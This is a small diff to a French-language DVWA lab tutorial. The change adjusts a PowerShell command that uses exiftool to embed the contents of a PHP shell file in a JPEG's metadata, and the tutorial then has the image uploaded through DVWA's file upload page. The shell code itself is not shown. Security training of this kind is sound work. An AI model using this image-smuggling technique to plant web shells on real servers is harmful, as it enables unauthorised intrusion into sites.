@@ -41,7 +41,7 @@ Inclure du code malveillant dans une image.
 
 ```powershell
 $document = Get-Content "cheminverslefichierShell.php"
-exiftool.exe -DocumentName="$document" "chemin_vers_image.jpg"
+.\exiftool.exe -DocumentName="$document" "chemin_vers_image.jpg"
 ```
 
 - Téléchargez l'image à l'aide de la page de chargement de DVWA (/DVWA/vulnerabilities/upload)
